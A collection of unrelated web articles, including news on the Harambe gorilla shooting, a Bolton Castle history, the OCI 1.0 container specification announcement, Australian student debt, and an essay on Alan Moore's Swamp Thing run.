A zoo shot and killed a 17-year-old gorilla that grabbed and dragged a four-year-old boy who fell into the its enclosure on Saturday afternoon.
Authorities said the boy, who fell 10 to 12 feet, is expected to recover after being picked up out of the moat and dragged by the 400-pound male, lowland gorilla named Harambe.
The boy was in the moat for about 10 minutes and was in between the gorilla's legs when the gorilla was shot, according to WLWT.
While zoo officials are still investigating, they believe the boy crawled through a railing barrier, and then fell into the moat.
A special zoo response team shot and killed a 17-year-old gorilla named Harambe (pictured) that grabbed and dragged a four-year-old boy who fell into its gorilla exhibit moat, the Cincinnati Zoo's director said
Video footage has emerged revealing some of the chilling moments of the time the boy was inside the moat as a panicked crowd looking on can be heard screaming as the ordeal unfolded
While zoo officials are still investigating, they believe the boy crawled through a railing barrier, and then fell into the moat
Zoo officials said at the time boy fell in the moat, three gorillas were in the enclosure but the two female gorillas were called out immediately.
However, a third gorilla, Harambe, remained in the yard with the child.
Video footage emerged on Saturday revealing some of the chilling moments of the time the boy was inside the moat, as a panicked crowd looking on can be heard screaming as the ordeal unfolded.
During the chaotic scenes, people can be heard shouting 'No, no!' and for someone to call 911.
At one point a woman appearing to be the child's mother yells down, 'mommy's right here,' 'mommy loves you,' and then says 'Isaiah be calm,' as the boy can be heard crying.
The graphic portions of the ordeal which apparently showed the gorilla dragging the boy through the water, were removed from the footage, according to by WLWT.
The child was taken to Cincinnati Children's Hospital Medical Center with serious injuries following the incident, which was reported around 4pm.
The boy was alert when he was taken to hospital, according to officials.
Harambe came to Cincinnati in 2015 from the Gladys Porter Zoo in Brownsville, Texas
Authorities said the boy, who fell 10 to 12 feet, is expected to recover after being picked up out of the moat (pictured) and dragged by the 400-pound-plus male gorilla named Harambe for more than 10 minutes
Hospital officials said they could not release any information on the child, whose name has not been released.
Director Thane Maynard said the zoo's dangerous animal response team, which practices for such incidents, decided the boy was in 'a life-threatening situation' and that they needed to put down the gorilla.
'They made a tough choice and they made the right choice because they saved that little boy's life,' Maynard said.
'It could have been very bad.'
Maynard said the gorilla did not appear to be attacking the child, but he said it was 'an extremely strong' animal in an agitated situation.
The Cincinnati fire department incident report stated that the gorilla was 'violently dragging and throwing the child,' according to WLWT.
Maynard explained that tranquilizing the gorilla would not have knocked it out immediately, leaving the boy in danger.
A day before Saturday's incident, the zoo had posted on its Facebook page asking the public to wish Harambe a happy 17th birthday
He also noted it was the first time that the team had killed a zoo animal in such an emergency situation, and he called it 'a very sad day' at the zoo.
Harambe came to Cincinnati in 2015 from the Gladys Porter Zoo in Brownsville, Texas. According to the zoo's website, it houses 11 gorillas.
The area around the gorilla exhibit was closed off on Saturday afternoon as zoo visitors reported hearing screaming.
The zoo is to be open as usual on Sunday but Gorilla World will be closed until further notice.
In March, two curious polar bears at the zoo wandered into a behind-the-scenes service hallway through an open den door, but never left a secondary containment area.
The zoo said the 17-year-old female Berit and the 26-year-old male Little One, entered an 'inappropriate' area but remained contained and were never loose or a threat to the public.
During that incident, zoo officials said staff followed protocols and safely returned the bears to their main holding area within two hours.
Bolton Castle is a 14th-century castle located in Wensleydale, Yorkshire, England (grid reference ). The nearby village Castle Bolton takes its name from the castle. The castle is a Grade I listed building and a Scheduled Ancient Monument.[1][2] The castle was damaged in the English Civil War, and “slighted” afterwards, but much of it survived. It has never been sold and is still in the ownership of the descendants of the Scrope family.
History [ edit ]
The castle was built between 1378 and 1399 by Richard, 1st Baron Scrope of Bolton, and is an example of a quadrangular castle. The licence to build it was granted in July 1379 and a contract with the mason John Lewyn was made in September 1378. Construction was reputed to cost 18,000 Marks.[3][4] The 16th-century writer John Leland described 'An Astronomical Clock' in the courtyard and how smoke was conveyed from the hearth in the hall through tunnels. Bolton Castle was described by Sir Francis Knollys as having 'The highest walls of any house he had seen'.
In 1536 John, 8th Baron Scrope supported the Pilgrimage of Grace rebellion against the religious reforms of King Henry VIII and gave Adam Sedbar, Abbot of Jervaulx sanctuary in the castle. In consequence John Scrope had to flee to Skipton pursued by the King's men but Abbot Sedbar was caught and executed. In retribution the king ordered Bolton castle to be torched, causing extensive damage. Within a few years, some of the damage had been repaired and Sir John had regained his seat in Parliament.
Mary, Queen of Scots, at Bolton [ edit ]
Mary, Queen of Scots was held prisoner at Bolton for six months.[5] The story goes that she escaped and made her way towards Leyburn only to lose her 'shawl' on the way, hence the name ('The Shawl') of the cliff edge that runs westward out of Leyburn and is a well-known spot for easy walks with excellent views.
After her defeat in Scotland at the Battle of Langside in 1568 she fled to England, posing a threat to the position of the Protestant Queen Elizabeth I. Mary was initially held at Carlisle Castle under the watch of Henry, 9th Baron Scrope, but Carlisle proved unsuitable and in July 1568 Mary was moved to Bolton. Her primary keeper at this location was Sir Francis Knollys who gave Mary Henry Scrope's own apartments in the South-West tower. Of her retinue of 51 knights, servants and ladies-in-waiting only 30 of her men and six ladies-in-waiting were able to stay in the castle, the rest taking lodgings nearby. Her household included cooks, grooms, hairdresser, embroiderer, apothecary, physician and surgeon. Bolton Castle was not initially suitable for housing a Queen, so tapestries, rugs and furniture were borrowed from local houses and nearby Barnard Castle in County Durham. Queen Elizabeth herself loaned some pewter vessels as well as a copper kettle.[6]
Mary's keepers allowed her to wander the surrounding lands and often to go hunting. Her prime occupation while at the castle was having her hair done by her friend Mary Seton. Francis Knollys (the elder), whom Mary nicknamed 'Schoolmaster', taught her English, as she only spoke French, Latin and Scots. She even met with local "Papists" (Catholics), something for which Knollys and Scrope were severely reprimanded.[6] In January 1569, Mary was removed from Bolton Castle for the last time, being taken to Tutbury in Staffordshire where she would spend much of the 18 years before her execution in 1587.[7]
Later history [ edit ]
Bolton Castle in June 2018, partially restored
After the death in 1630 of Emanuel Scrope, 1st Earl of Sunderland, without any legitimate children, Bolton Castle was inherited by Mary the eldest of his three illegitimate daughters. She married Charles Powlett, 6th Marquess of Winchester and 1st Duke of Bolton.
The castle is currently owned by their descendant, Harry Algar Nigel Orde-Powlett, 8th Baron Bolton, who inherited on his father's death.[8] His residence in 2016 was Wensley Hall, Wensley, Leyburn. [8] Bolton Castle is run by his son and daughter-in-law, Thomas and Katie Orde-Powlett.[9]
There is also a garden including a maze, herb garden, wild flower meadow, rose garden and a vineyard on the site.[10] Falconry displays are provided to visitors during some months. The castle is now a tourist attraction and is also rented out occasionally for events such as weddings.[11] Part of the structure is a ruin but the other section has been restored; this attraction had a 4.5-star rating in mid 2018 by the users of TripAdvisor who had visited the castle.[12]
Film location [ edit ]
Several film and television productions have used the castle as a location, including the films Ivanhoe (1952), Elizabeth (1998)[13] and the television series Heartbeat and All Creatures Great and Small when James proposes to Helen.[14] An episode about William Shakespeare, Bill, was also filmed at Bolton Castle as part of the Horrible Histories (2015 TV series) children's series.[15][16]
Governance [ edit ]
Castle Bolton is the name of the nearby village with a population under 100 in the 2011 Census. Bolton Castle is also the name of an electoral ward. The total population of this ward taken at the 2011 census was 1,269.[17]

The Bureau of Land Management is in discussions with the family of Dwight and Steven Hammond to restore the family's grazing access to federal lands.It's unclear how far along those talks are in producing an agreement, but Bureau of Land Management spokeswoman Jody Weil said the talks have been underway since May 2015.“Before the Hammonds were resentenced ( for arson in October 2015 ), we started having conversations with the Hammonds,” said Weil. “We're certainly talking to the Hammonds' attorney still.”Weil declined to comment on whether the negotiations have been impacted by the occupation of the Malheur National Wildlife Refuge.“It's a legal process,” Weil said. “I can't comment on that.”Calls to the Hammond family were not returned, but Oregon Cattlemen's Association President John O'Keeffe confirmed his organization is also part of the negotiations.“It's an ongoing effort and discussion with the BLM,” said O'Keeffe. “When it's all over with, I can talk about it.”O'Keeffe said the Cattlemen's Association is “hopeful” the Hammonds' grazing rights will be restored.Armed militants have cited the revocation of grazing rights for the family of Dwight and Steven Hammond as one of the reasons they've occupied the refuge since Jan. 2. But a federal source told OPB the occupation is complicating that discussion, along with a pending appeal in front of a Department of Interior appeals board.The Hammonds – through their company Hammond Ranches, Inc. – were denied a renewal of their permit based on the father and son's arson conviction in 2014.In a 21-page BLM ruling issued in 2014 that explained the denial of grazing rights, District Manager Brendan Cain wrote that the arsons were “part of a pattern of conduct by the Hammond Ranches, Inc.'s owners … attempting to improve livestock forage at the risk of human life.”However, even if the BLM allowed the Hammond family to again graze cattle on the land, the occupiers said that permission wouldn't be enough to get the militants to leave the refuge.“Absolutely not,” militant leader Ammon Bundy said Thursday, “because the BLM does not have authority to be here. They do not have the authority to be managing the lands and resources inside the state.”

Pete Hoekstra denied he had ever said there were "no-go zones" in the Netherlands, calling it "fake news".
But the Dutch journalist showed him a clip of the comments from 2015.
The Trump appointee then appeared to deny the "fake news" term he had used earlier in the interview.
The exchange left Wouter Zwart, US correspondent for Dutch broadcaster NOS, visibly confused in the short clip that has been widely shared on social media.
The exchange:
Zwart: Speaking of threat, at one point you mentioned in a debate that there are no-go zones in the Netherlands and that cars and politicians are being set on fire.
Mr Hoekstra: I didn't say that. That is actually an incorrect statement. Yeah, we would call it fake news.
Zwart: Is that fake news? Because that's what you really said.
Mr Hoekstra: No, it's not what I said.
Mr Hoekstra (on archive video): The Islamic movement has now got to the point where they have put Europe into chaos. Chaos in the Netherlands, there are cars being burned, there are politicians that are being burned. And yes, there are no-go zones in the Netherlands.
Zwart: You called it fake news, obviously... (is interrupted)
Mr Hoekstra: I didn't call that fake news, I didn't use the words today.
Zwart: No?
Mr Hoekstra: No. I don't think I did.
The former Republican congressman was sworn in by Vice-President Mike Pence on 11 December after being nominated earlier this year by President Donald Trump.
He takes up his post next month but has already prompted jokes at the heart of the Dutch government. Prime Minister Mark Rutte suggested to reporters that Pete Hoekstra might be related to Dutch Finance Minister Wopke Hoekstra, before quickly denying it.
"It's true that he's coming but it's fake news that he's a relative of the finance minister. I've just spread that so I also take it back," he said.
Pete Hoekstra was born in Groningen in the Netherlands but moved to the United States with his family when he was three.
He served in Michigan from 1993 to 2011, and is also a former chair of the House Intelligence Committee.
The interview was an excerpt from a longer profile piece on the new ambassador by the current affairs programme Nieuwsuur (Newshour).
New Delhi: Prime Minister Narendra Modi on Saturday met journalists and editors over tea. Here are the updates:
It was a brief address. The PM is now personally meeting editors and journalists and informally interacting with them.
PM Modi concludes his address.
Journalists have transformed their pen into broom – PM Modi.
Media is helping spread the Clean India message.
Have not seen any media coverage in which effort has not been made to inspire people to strive for Clean India.
The thinking earlier was that everything will be done by government. Now the thought is that we will all work together – PM Modi.
Due to the media coverage on cleanliness, governments have been forced to wake up – Modi.
This is service to the nation – PM Modi.
I thank media – both print and electronic - for focussing on cleanliness and Clean India mission.
PM Modi says the media can play a much larger role in shaping the future of the country.
There was a time when I used to move chairs at the party office and used to freely interact with members of the press, says PM.
I am looking for ways to deepen my old ties with the fourth estate – Modi.
I wish you all on the occasion of Diwali and Bhai Dooj, says PM Modi.
PM Narendra Modi is now addressing the media.
After General Elections, BJP has registered unexpected victories.

==========
Earlier story: Narendra Modi has come to be known as a prime minister who keeps the media at an arm's length. He speaks to the media when he wants and says only what he wants to say.
However, that may change on Saturday when the PM meets journalists and editors over tea.
The occasion will be 'Deepawali Milan', to be organised at the BJP headquarters at 11, Ashoka Road.
Also in attendance will be party president Amit Shah and several Union ministers.
The programme is scheduled to begin at 11 am. PM Modi will arrive at the same time and stay there for about an hour.
The interaction will be followed by lunch.
The media outreach comes a day before the Prime Minister hosts NDA allies at a tea party.
At tomorrow's tea party, the BJP and Shiv Sena are expected to patch up before forming a coalition government in Maharashtra.
While Shiv Sena MPs have confirmed their participation, it is still not clear whether party chief Uddhav Thackeray will attend.
Open Container Initiative Specifications are 1.0
• By Brandon Philips
After two years of work with major stakeholders in the community, we're excited to announce that the Open Container Initiative (OCI) image and runtime specifications have now hit version 1.0. This means there is now a stable industry standard for application containers that has been created and approved by leaders in the container industry. This is an important milestone for the OCI community, and we look forward to working with our partners to further facilitate standards and innovation.
CoreOS started the conversation about container specifications years ago, and we are pleased to have worked alongside the major leaders across the industry to create this release. As chair of the OCI Technical Oversight Board, we appreciate the work the open source community has done to reach this milestone. Users can expect the OCI to continue to help grow the market of interoperable and pluggable tools, giving them confidence that containers are here to stay. Further, Kubernetes users are already using parts of OCI specifications today and the community is actively working to ensure growing support for both the OCI Image and OCI Runtime specifications in future releases.
OCI: A history
At CoreOS, we believe that open standards are key to the success of the container ecosystem, and that the best way to achieve standards is by working closely with the community. The Open Container Initiative (OCI) is an open governance organization tasked with creating standards for container image formats and runtimes. CoreOS is a founding member of the OCI, and we've worked diligently with other leaders in the container industry – including such organizations as Docker, Microsoft, Red Hat, IBM and Google – to bring this project to its first stable release. The goal of the OCI is to create specifications that enable a compliant container to be portable across all major, compliant operating systems and platforms while minimizing technical barriers.
The origins of the OCI date back to 2015, when we met with Docker, Google and other stakeholders to discuss the future of the container industry. You can read more about it in this 2015 blog post. We all shared an interest in creating an industry standard which led directly to the creation of the OCI.
The OCI began with a focus on the runtime of containers; that is, creating a specification on the mechanisms and environment of an actively executing container. As the conversation developed, we agreed that a standard image format was even more critical to ensure application packagers could create one container image that could run in and be ported to any environment. And in 2016 the OCI Image Specification began. Over the last two years these two specifications have developed to maturity and have been implemented in a variety of implementations.
Thank you to the OCI and container community
We'd like to thank the founding members of the OCI and our Technical Oversight Board from CoreOS, Red Hat, Docker, Microsoft, Google, and the Linux Foundation, including: Chris Wright, Vincent Batts, Diogo Mónica, Michael Crosby, John Gossman, Jason Bouzane, Vishnu Kannan, and Greg Kroah-Hartman. We also want to thank Chris Aniszczyk and Jill Lovato, our leadership at the OCI. Finally, we'd like to thank the community for their help and for being the inspiration behind this project.
What to expect now?
The work done in the OCI will help ensure users can create container images, using any number of OCI conforming tools, and be assured they will run on any number of container orchestration environments that can execute OCI conforming images. This will ensure teams can choose the build and runtime tools that best meets their needs and with this 1.0 release users can be confident that any images and tooling built against this release will receive wide support well into the future.
However, the work of OCI isn't complete with this release. The maintainers of the OCI specifications will now turn their attention to a number of features and ideas that could wait until a post-1.0 release, including distribution, signing and continued platform support. Also, the conformance process for OCI can now begin to build processes to enable tools to be recognized as OCI conformant implementations. And finally, we anticipate that with this release a number of new and existing tools will implement the specifications, including the ecosystem of container engines, container orchestrators and container build tools.
You can stay up to date with information on implementations of the OCI, as well as Kubernetes and product releases by signing up for our newsletter or the OCI mailing list if you are interested in getting more involved.
Sunderland's prospective new German owners want fellow countryman Jurgen Klinsmann to be the club's next manager in order to give the Black Cats a new impetus and glamour after years in the doldrums.
The ambitious group are locked in talks with current owner Ellis Short and have big plans should they complete a £90million takeover in the next few days.
Klinsmann is central to their idea of trying to raise the profile of Sunderland, who were relegated from the Premier League last season under David Moyes.
Sunderland's prospective new German owners want Jurgen Klinsmann to be the next manager
The ambitious group is currently locked in talks with current Sunderland owner Ellis Short
Sunderland were relegated from the Premier League last season under David Moyes
The 52-year-old is an internationally-recognisable figure who won over the English public during two spells as a player with Tottenham Hotspur.
He also boasts a World Cup winner's medal as a player with West Germany in 1990, and is credited with leading another revolution in German football as manager of their 2006 World Cup semi-final side which played in a more attacking manner than their predecessors.
Klinsmann has not had a manager's job since he was sacked as manager of the USA national team last November and while the chances of persuading him to swap southern California for the north-east of England doesn't sound promising, he is a confirmed Anglophile who is also keen to re-establish himself as a football manager.
Klinsmann is a recognisable figure who won over the English public during two spells at Spurs
Sunderland had upset the odds to escape relegation in recent seasons under Diego Poyet, Dick Advocaat and Sam Alardyce, but their luck ran out earlier this year when they went down under Moyes. He subsequently left the club with £30million goalkeeper Jordan Pickford exiting shortly afterwards to join Everton.
In the background, Short's attempts to sell the club have become more serious. Fans' consortium Fulwell73 pulled out of negotiations last week leaving their unnamed German rivals with a clear run at completing a takeover.
Sunderland is due to return to pre-season training on Thursday and Short will try to have his business concluded before the end of the week.
If he can't sell the club, Preston North End manager Simon Grayson is favourite to succeed Moyes, but German owners are likely to want their own man and if they can't get Klinsmann, Union Berlin manager Jens Keller is a possibility.
Richardson police are asking for the public's help finding the driver of a white sedan who was involved in a deadly road rage shooting early Thursday on the southbound U.S. 75 Frontage Road between Campbell and Belt Line roads. (Published Thursday, May 18, 2017)
Police Ask for Help Finding Driver in Road Rage Shooting
A man killed in what police are calling a road rage shooting in Richardson Thursday morning has been identified as 27-year-old Robert Klikus.
The shooting took place on the southbound U.S. 75 Frontage Road between Campbell and Belt Line roads at about 6:30 a.m.
Police said Thursday afternoon they were still searching for the shooter, who drove off headed east on Arapaho Road in a white vehicle after the shooting.
Thursday afternoon Richardson police released surveillance video showing a white, four-door 2012 Toyota Camry sedan leaving the scene.
Witnesses told police they heard two drivers arguing at the intersection of the service road and West Arapaho Road before before hearing a single gunshot.
Hitalo Villa was driving to work when he saw the victim's car driving very slowly along the service road.
"I was thinking the guy was sleeping and I stopped and I try to help and try to wake him up," Villa said. "When [the car] was getting close to the freeway I knew I had to do something."
Villa did not witness the shooting or what led up to it.

Villa got out of his wife's car, ran to the passenger side of Klikus's car and punched the window until it shattered.
"I just go around [to the driver's side] and the window was open, and I pull my hand do this to the wheel," he said, turning his hand.
Villa forced the victim's car to crash into a light pole where it came to a rest.
"If I get a chance to help somebody [I do] because you never know when you're going to need somebody to help you," he said.
Richardson police do not know what led up to the road rage incident or if the two men involved in the shooting knew each other.
Frontage Road remained closed for several hours while police investigated at the scene. Richardson police asked anyone with information about the shooting to call them at 972-744-4800.

The Hollywood Reporter reports that Oscar winner J.K. Simmons has been cast as Commissioner Gordon in the upcoming Justice League films. The announcement means that Simmons, probably best known for his turn as J. Jonah Jameson in the first Spider-Man trilogy, has made a big jump from Marvel to DC, news that will probably disappoint comics fans everywhere.
Commissioner Gordon is one of Batman's most important supporting characters
Commissioner Gordon is one of Batman's most important supporting characters, serving as a fellow crusader in the Dark Knight's war on crime. As police commissioner, he leads a corrupt police department while aiding Batman against villains like Two-Face and the Joker. A number of actors have played the role over the years, including Pat Hingle in the Batman '89 series of films, and Gary Oldman in The Dark Knight trilogy. Ben McKenzie currently fills Gordon's shoes in the Fox series Gotham.
Simmons took home the Academy Award for Best Supporting Actor last year for his role in Whiplash. Today's news now means he'll be joining the likes of Henry Cavill, Ben Affleck, and Gal Gadot onscreen when Justice League Part One hits theaters on November 17th, 2017.

The academics say that by the 2017–18 financial year HELP debt will grow to be $70.4 billion, affecting 26 per cent of people aged 18 to 54. Do students really understand what their actual debt will be? The scary thing is that some students' individual debt is bigger than they anticipated. Students who studied part of a degree and then swapped to another course have added six months to a couple of years more to their debt. There are also students who enrol in subjects and degrees they decide they don't like and neglect to withdraw from them by the date they start to incur their debt.
Please take note: The cut-off date for withdrawing from courses without incurring financial penalties is usually in March. Check with individual universities for the date they have set. Some students do an arts degree and include subjects from other faculties. The fees for those subjects may be higher than for the arts ones. For example, an arts subject costs $782 and a law subject $1305, based on this year's charges. Many students are also going to be saddled with an undergraduate and postgraduate debt. Not that many first-years or other undergraduates will be thinking about that. To many, it seems like years before they'll start paying back their debt, particularly a postgraduate one. The reality is that many graduates go on to do postgraduate course-work study, most of which is full-fee paying. There are myriad postgraduate certificates, graduate diplomas and masters course in areas such as law, medicine, international studies, publishing, business and social work.
After doing an arts degree, Third Degree's god-daughter's intention was to study a master's in art curatorship. She has since left for America. Her arts degree would have cost about $18,000 plus fees for the master's. If she were unable to secure one of the limited commonwealth-supported places, she would have been up for the full-fee of $50,053 for the two-year master's at Melbourne University. (Although she is now living in America, she will be required from 2017 to make repayments on her government student fee loan for the two years of her arts degree based on her world-wide income. Students and graduates living overseas haven't had to repay their loans until now). Many students are signing up for graduate law courses, which are expensive. This year La Trobe University has introduced a Juris Doctor, which will cost local students $32,990 for each year of the three-year degree. International students will be charged the same. The whole degree will cost $98,970. When you add the cost of this to an undergraduate degree, those enrolled in the JD will have a combined debt in excess of $100,000. An undergraduate degree is a prerequisite for a JD.
Universities Australia modelling shows that a three-year undergraduate degree takes about 17 years to pay off. Imagine how many more years graduates would take to rid themselves of their postgraduate debt. Here's another common example. A three-year undergraduate science degree costs $26,751, based on this year's figure. If the student has to pay full fees for a four-year postgraduate medical degree at Melbourne University it will be about $260,000. This year, there are up to 90 full fee places for local and international students in the course, and 260 places for commonwealth-supported students. And at many universities the one-year graduate diploma in education has been turned into a two-year master's degree. Most students get a Commonwealth-supported place, but some pay full fees. Nevertheless because it's taking students longer to become teachers, it costs them more and they are in debt for longer. Instead of taking four years to become a teacher (three-year undergraduate degree and one year dip ed), it now takes many students five or six years depending on whether they do an honours year in their undergraduate course. Australia is clearly not the cheapest country to study in. In 2013, Third Degree reported that Germany was phasing out university fees.
On the other hand Australian graduates only start to repay their debt once their salary reaches a particular threshold. This type of loan has meant that more students can access universities. But it still leaves graduates with big debts. So much focus now is on entry scores to universities. It's time there was more discussion about the level of debt students may amass and how best they can manage it.

Alan Moore began his career as a minor cartoonist working for his local newspaper and U.K. music magazines, producing humour strips like Maxwell the Magic Cat, Roscoe Moscow, and The Stars My Degradation. Believing himself to be a slow and mediocre artist, he changed direction and soon focused primarily on writing. This led to him writing scripts for short stories and series for Marvel UK (working on Doctor Who comics and Captain Britain), 2000 AD (short twist ending stories and serials like Skizz, D.R. and Quinch, and Halo Jones) and Warrior (which included his work on V for Vendetta and Marvelman). He was dedicated to writing the most entertaining and thought-provoking scripts that he could, and his work proved popular with British comic fans. He was a vocal supporter of comics as a valuable medium, yet some time in 1983, he stopped producing work for comics and disappeared from public life. He never wrote for public consumption again.
Now, imagine if that had happened. Let's just take a few moments to think about how different comics history would have been on this alternate Earth. The first major change would be the cancellation of Saga of the Swamp Thing, as Moore would not have been hired to write and save the title. There would be no wonderful work on the mainstream DC titles, such as the classic Superman stories like “For the Man Who Has Everything” and “Whatever Happened to the Man of Tomorrow?” nor other seminal works like Watchmen, Supreme, From Hell, Lost Girls, or League of Extraordinary Gentleman. Neil Gaiman would never have picked up an Alan Moore Swamp Thing comic and establish contact with Moore, who taught him how to write a comic script. As such, we may never have had Sandman. We may never have seen the British Invasion of writers in the 1980s, which led to works like Grant Morrison's Arkham Asylum, Animal Man, and Doom Patrol. We'd have no John Constantine or Hellblazer and probably no Vertigo line of comics.
Moore's work on Swamp Thing is a key moment in the evolution of comics, and so it is imperative to have an analytical study of these important and ground-breaking issues. I'll begin with a brief history of Swamp Thing's appearances before Moore's run.
The Swamp Thing character was created by Len Wein and Bernie Wrightson and first appeared in House of Mystery #92 (June-July 1972) in a short, eight-page story. Set in the early 20th century, Alex and Linda Olsen are the perfect couple, both happy and deeply in love, but Alex's co-worker, Damian Ridge, wants Linda for himself. Ridge causes a laboratory explosion that kills Alex, who he throws into a nearby swamp. Ridge soon manipulates an emotionally vulnerable Linda, and they marry. Meanwhile, Olsen's body became saturated with chemicals causing him to transform into a swamp monster. He is unable to speak and is distraught at his deformity, and so he watches over Linda from a distance, until Ridge tries to kill her, as he fears she will discover what he has done. The monster is forced to act, killing Ridge and saving Linda, who sees only the monster and not the man that she once loved. She is petrified by his presence, so the Swamp Thing leaves, unable to communicate with Linda and reveal his true identity.
The story provoked a huge amount of positive mail, no doubt due to its heady mix of powerful and emotive themes like betrayal, lust, and revenge. Yet Swamp Thing wasn't the only plant-based monster to debut in the early 1970s. There are strong links to Man-Thing, a Marvel comics character (created by writers Stan Lee, Roy Thomas, Gerry Conway, and artist Gray Morrow), who first appeared in Savage Tales #1 (May 1971), which was a black and white comics magazine aimed at a more adult audience. Len Wein was roommates with Gerry Conway at this time, and the similarities between the characters were noticed in the Marvel offices. The first Man-Thing story predates the first appearance of Swamp Thing (House of Mystery #92, dated June-July 1972) and the revamped version in Swamp Thing #1 (October-November 1972). Conway tried to persuade Wein to make changes, but Wein didn't agree that there was a problem. No legal action was taken by Marvel, probably because both characters seemed to share common sources of inspiration and lineage: the monster in a prose short story called “It,” written by noted SF author Theodore Sturgeon in 1940, is the earliest influence, followed by the Heap, a character created by writer Harry Stein and artist Mort Leav, that first appeared in Air Fighters #3 (Hillman Periodicals, December 1942).
DC decided to capitalise on the popularity of the first Swamp Thing story by giving the character his own comic. Swamp Thing #1 (October-November 1972) saw Wein and Wrightson create an updated version of Swamp Thing set in the present day, which would probably have a more long-term appeal to a modern audience. In this new version, scientists Alec and Linda Holland have created a bio-restorative formula designed to enhance plant growth. Despite threats, they refuse to sell it to agents of the mysterious Mr E. [1] The agents attempt to kill Holland with explosives, as per their instructions. Holland, covered in both flames and the formula, runs headlong into the swamp, to emerge later as the Swamp Thing. Linda is killed, and Matt Cable, a government agent responsible for the protection of the Hollands, mistakenly blames the creature for the death of the couple.
The stories tend to swing between SF and horror (something that Moore would use to his advantage during his run). A quick survey of the issues of this run bears that out. The monstrous Un-Men are Swamp Thing's first foes, led by Anton Arcane, who becomes Swamp Thing's nemesis. We also meet Abby Arcane, who becomes the key supporting character in the book and central to Moore's later issues (#2 and #3). There are appearances by a werewolf (#4), a brother and sister accused of witchcraft (#5), and a town full of robots (#6). Swamp Thing is linked to the wider DC universe in a team-up with Batman (#7), and H.P. Lovecraft's influence is evident in #8 when the people of Perdition, a mining town, are disappearing due to a monstrosity called M'Nagalah. Ghosts (#10), mutant worms (#11), and a gem that enables time travel (#12) swiftly follow. After Swamp Thing reveals his true identity to Matt Cable in #13, the SF / horror madness continues with a telekinetic child (#14); a priest / black magician and a demon called Nebrios (#15); Zombies on the island of Kala Pago (#16-17); old people leaching the vitality and youth of younger people in Serenity Village (#18); a fight with another Swamp Thing grown from an arm he lost in #5 (#19-20); a visit to an alien planet and an encounter with Solus, an alien ex-tyrant (#21); being captured by the government and placed in a facility with mutants (#22); encountering Holland's brother Edward and his girlfriend Ruth Monroe being attacked by Thrudvang (a monster); and regaining his humanity (#23-24).
With the benefit of hindsight, the title probably tried to do too much too quickly. Despite the core momentum of the central conceit of the book, having Swamp Thing travel from place to place helping people in need and yearning for his lost humanity, the dizzying array of concepts led to a lack of coherence. This was not helped by changes in the creative team within a relatively short period of time. [2] An advertised team-up with Hawkman in a proposed #25 never saw print, as the series was cancelled with #24 due to poor sales. It seemed that the promise of the early issues had faded to nothing.
Swamp Thing would next appear in a run of stories in Challengers of the Unknown (#83-87). Holland, after reverting to his Swamp Thing state, once again encounters M'nagaleh (from #8) before joining the Challengers and Deadman in the year 12,000,000 to find Rip Hunter. Swamp Thing would also battle Solomon Grundy with Superman's help in DC Comics Presents #8 and team up with Batman against the Delta Organization in The Brave and the Bold #176. They were adequate stories, but none are particularly memorable or noteworthy, and Swamp Thing often seemed ill suited as a supporting character in other characters' books with characters whose powers and environments are so different to his own. These guest appearances, and the stories in the first Swamp Thing series, depict a dour character mired in the tragedy of his lost humanity: he was, as Alan Moore put it, “Hamlet covered in snot,” and it became one of the features that Alan Moore sought to change with his run on the title, moving the character away from being a persecuted victim to a more pro-active force to be reckoned with.
In 1978, a proposed comeback, in the form of his own title, may have offered the chance to reverse the fortunes of the character, but it fell victim to the “DC Implosion” of that year, when a number of existing and proposed series were cancelled for reasons that included higher production costs and poor sales. It seemed that Swamp Thing would remain in limbo forever.
It was the release of the Swamp Thing feature film (1982), directed by Wes Craven and starring Dick Durock as the title character, that led to the creation of a second ongoing series. The Saga of the Swamp Thing, written by Marty Pasko with art by Tom Yeates, continued in a similar vein to its predecessor but offered a more consistent focus on horror, with SF elements kept to a bare minimum: vampires from Rosewood, Illinois (#3), which Moore would return to in his own run; a demon that murdered children (#4); a squid-like monster (#6-7); mutated marines (#8); mystic pendulums, Nazis, and Golems (#10-12); and an appearance by the Phantom Stranger (#14 and 15). New characters were added to the cast: Harry Kay, a former Nazi trustee and now an agent of the Sunderland Corporation (an organisation that was trying to capture Swamp Thing throughout the early issues of volume 2); Dr. Dennis Barclay, another Sunderland employee; and Liz Tremayne, a reporter and TV host. They proved to be key characters in these issues, with Moore exploring their fate during his run.
Despite a solid run of stories, sales once again began to suffer. Len Wein, who now edited the title, brought in a new art team with #16 – Steve Bissette and John Totleben, both graduates of the Joe Kubert School of Cartoon and Graphic Art. This would prove to be a crucial step in ensuring the future of both the character and the title. Marty Pasko had also tired of writing the book, and he left with issue #19. Wein needed a new writer for the book, and he had the good sense to realise that a fresh voice was needed if there was any chance of pulling the series back from the brink of cancellation. He began to think about the short stories and serials he'd read in some British anthology comics, namely 2000 AD and Warrior, and he realised that the same writer was responsible for his favourite ones. He managed to find a phone number for the British writer through his contacts in the comic field. He rang up Alan Moore, introduced himself, and asked Moore if he was interested in producing a pitch for the series.
Moore was convinced it was a fellow comics fan or professional playing a joke. By all accounts, it took some convincing on Wein's part until Moore realised that Wein was indeed who he said he was. Moore also realised that this could be his break into American comics. It wasn't an auspicious beginning though, as Swamp Thing was considered a third-rate, lower-tier character in the DC universe, especially with its flagging sales and an all-but-cancelled title. Wein and Moore saw this as an opportunity to let loose and experiment with the comic.
A final, strange coincidence hovers over the story of how Moore began work on this title. A few weeks before Wein's phone call, Moore had set himself a creative challenge. He wanted to assess his creative abilities, particularly in light of his success with his Marvelman revision, where he had taken an obscure British superhero (a second-rate Captain Marvel copy, essentially) and chipped away at the concept, refashioning it for the modern era. He wondered if he would be able to repeat his success with an American character, whether he could capture revisionist lightning twice. The character he chose for this thought experiment was the Heap, a close relation to, and predecessor of, the Swamp Thing. He wouldn't recall this coincidence until later, but it's strange to think that he may have had a premonition that he would be working on a swamp-based character. Moore wrote a 15-page proposal which analysed, deconstructed, and reconstructed the character and his world, and it proved to be his entry ticket into the world of American comics and widespread international acclaim.
Moore's debut issue, #20, wasn't reprinted until 2009. It became viewed as a clearing exercise for Moore to begin afresh with #21, something the title “Loose Ends” helped to emphasise. It wasn't considered important enough in light of the magisterial issue #21, which seems to offer a more definite start to Moore's work on the series. Despite this, #20 is a critically neglected gem that has some interesting things to say.
More on that issue next time.
